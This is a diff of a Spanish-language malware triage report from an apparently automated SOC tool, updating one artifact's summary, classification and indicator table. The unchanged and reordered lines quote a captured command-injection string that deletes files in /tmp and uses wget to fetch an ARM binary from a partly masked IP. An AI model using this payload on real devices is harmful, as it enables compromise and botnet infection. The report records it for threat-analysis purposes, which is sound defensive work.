@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 278 B. Formato identificado como ASCII text, with no line terminators. Entropía registrada: 4.85. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,8 +51,8 @@ act=signin&lang=en&outemail=`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wg
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | ip | 201.51.13.XXX | static_analysis |
-| hash | 1c10e70bd7b0d2ef7396bf1762f143b8f829bb689f61a2d991f83e5e98b02bd5 | static_analysis |
 | command | act=signin&lang=en&outemail=`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmo | strings |
+| hash | 1c10e70bd7b0d2ef7396bf1762f143b8f829bb689f61a2d991f83e5e98b02bd5 | static_analysis |
 
 ## 🔎 Triage
 
